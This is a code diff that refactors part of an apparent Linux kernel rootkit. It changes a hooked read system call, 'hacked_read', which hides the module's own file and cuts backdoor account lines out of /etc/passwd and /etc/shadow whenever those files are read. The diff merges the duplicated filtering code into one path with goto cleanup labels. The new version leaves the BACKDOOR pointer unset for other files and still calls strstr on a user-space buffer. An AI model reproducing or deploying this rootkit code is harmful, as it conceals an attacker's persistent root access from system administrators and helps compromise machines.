@@ -314,18 +314,19 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
 	struct path *path;
 
 	char *tmp_buf;
+	char *BACKDOOR;
 
 	ret = (*orig_read)(fd, buf, count);
 
 	if(ret <= 0){
-		return ret;
+		goto exit;
 	}
 
 	file = fget(fd);
 
 	if(!file){
-		DEBUG("file doesn't exist");
-		return ret;
+		//DEBUG("file doesn't exist");
+		goto exit;
 	}
 
 	path = &file->f_path;
@@ -335,17 +336,17 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
 
 	if(!tmp){
 		path_put(path);
-		DEBUG("couldnt create tmp");
-		return ret;
+		//DEBUG("couldnt create tmp");
+		goto cleanup1;
 	}
 
 	pathname = d_path(path, tmp, PAGE_SIZE);
 	path_put(path);
 
 	if(IS_ERR(pathname)){
-		free_page((unsigned long)tmp);
-		DEBUG("pathname errors");
-		return ret;
+		//free_page((unsigned long)tmp);
+		//DEBUG("pathname errors");
+		goto cleanup1;
 	}
 
 	if(strcmp(pathname, MODULE_FILE)==0){
@@ -353,70 +354,49 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
     }
     
 	if(strcmp(pathname, PASSWD_FILE)==0){
-
-		if(!(strstr(buf, BACKDOOR_PASSWD))){
-			return ret;
-		}
-
-		tmp_buf = kmalloc(ret, GFP_KERNEL);
-		if(!tmp_buf){
-			return ret;
-		}
-
-		copy_from_user(tmp_buf, buf, ret);
-
-		if(!tmp_buf){
-			kfree(tmp_buf);
-			return ret;
-		}
-
-		if((strstr(tmp_buf, BACKDOOR_PASSWD))){
-			char *strBegin  = tmp_buf;
-			char *substrBegin = strstr(strBegin, BACKDOOR_PASSWD);
-			char *substrEnd = substrBegin + strlen(BACKDOOR_PASSWD);
-			int remaining_length = (int)(strlen(substrEnd)) + 1 ;
-			memmove(substrBegin, substrEnd, remaining_length);
-			ret = ret - strlen(BACKDOOR_PASSWD);
-		}
-
-		copy_to_user(buf, tmp_buf, ret);
-		kfree(tmp_buf);
+		BACKDOOR = BACKDOOR_PASSWD;
 	}
 
 	if(strcmp(pathname, SHADOW_FILE)==0){
-
-		if(!(strstr(buf, BACKDOOR_SHADOW))){
-			return ret;
-		}
-		
-		tmp_buf = kmalloc(ret, GFP_KERNEL);
-		if(!tmp_buf){
-			return ret;
-		}
-
-		copy_from_user(tmp_buf, buf, ret);
-
-		if(!tmp_buf){
-			kfree(tmp_buf);
-			return ret;
-		}
-
-		if((strstr(tmp_buf, BACKDOOR_SHADOW))){
-			char *strBegin  = tmp_buf;
-			char *substrBegin = strstr(strBegin, BACKDOOR_SHADOW);
-			char *substrEnd = substrBegin + strlen(BACKDOOR_SHADOW);
-			int remaining_length = (int)(strlen(substrEnd)) + 1 ;
-			memmove(substrBegin, substrEnd, remaining_length);
-			ret = ret - strlen(BACKDOOR_SHADOW);
-		}
-
-		copy_to_user(buf, tmp_buf, ret);
-		kfree(tmp_buf);		
+		BACKDOOR = BACKDOOR_SHADOW;		
 	}
 
-	free_page((unsigned long)tmp);
+	if(!(strstr(buf, BACKDOOR))){
+		goto cleanup1;
+	}
 
-	return ret;	
+	tmp_buf = kmalloc(ret, GFP_KERNEL);
+	if(!tmp_buf){
+		goto cleanup1;
+	}
+
+	copy_from_user(tmp_buf, buf, ret);
+
+	if(!tmp_buf){
+		goto cleanup2;
+	}
+
+	if((strstr(tmp_buf, BACKDOOR))){
+		char *strBegin  = tmp_buf;
+		char *substrBegin = strstr(strBegin, BACKDOOR);
+		char *substrEnd = substrBegin + strlen(BACKDOOR);
+		int remaining_length = (int)(strlen(substrEnd)) + 1 ;
+		memmove(substrBegin, substrEnd, remaining_length);
+		ret = ret - strlen(BACKDOOR);
+	}
+
+	copy_to_user(buf, tmp_buf, ret);
+	
+	cleanup2:	
+	if(tmp_buf) 
+		kfree(tmp_buf);
+	
+	cleanup1:
+	if(tmp) 
+		free_page((unsigned long)tmp);
+
+	exit:
+		return ret;	
 }
 
 void set_addr_rw(unsigned long addr)
